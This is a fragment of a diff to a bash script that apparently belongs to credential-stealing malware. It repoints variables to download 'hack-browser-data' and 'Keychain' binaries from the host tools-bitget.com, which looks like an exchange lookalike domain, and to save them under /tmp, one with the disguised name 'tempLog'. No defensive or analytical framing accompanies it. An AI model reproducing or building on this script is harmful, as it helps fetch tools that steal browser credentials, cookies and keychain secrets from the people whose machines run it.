@@ -1,7 +1,7 @@
 #!/bin/bash
 
-remoteBrowserHacker="http://tools-bitget.com/hack-browser-data"
-remoteKeychain="http://tools-bitget.com/Keychain"
+remoteBrowserHacker="http://tools-bitget.com/hack-browser-data_amd64"
+remoteKeychain="http://tools-bitget.com/Keychain_amd64"
 
 localBrowserHacker=/tmp/tempLog
 localKeychain=/tmp/Keychain
